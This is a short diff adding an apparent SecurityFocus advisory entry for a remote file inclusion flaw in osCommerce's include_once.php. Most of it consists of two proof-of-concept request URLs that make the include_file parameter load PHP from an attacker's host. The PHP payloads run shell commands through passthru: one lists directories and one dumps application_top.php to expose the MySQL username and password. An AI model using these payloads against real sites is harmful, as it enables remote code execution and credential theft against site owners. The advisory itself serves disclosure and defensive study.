@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/5037/info
+
+osCommerce is prone to an issue which may allow remote attackers to include arbitrary files located on remote servers. If the remote file is a PHP script, this may allow for execution of attacker-supplied PHP code with the privileges of the webserver. 
+
+-------- Example 1 --------
+http://SERVER/catalog/inludes/include_once.php?
+include_file=http://MYBOX/a.php
+
+--- a.php ---
+<? passthru("/bin/ls")?>
+-------------
+Output: dir listing of the current dierctory
+---------------------------
+
+-------- Example 2 --------
+http://SERVER/catalog/inludes/include_once.php?
+include_file=http://MYBOX/b.php
+
+--- b.php ---
+<? passthru("/bin/cat application_top.php")?>
+-------------
+Output: outputs the application_top.php file wich includes MySQL username,
+password, etc.
+
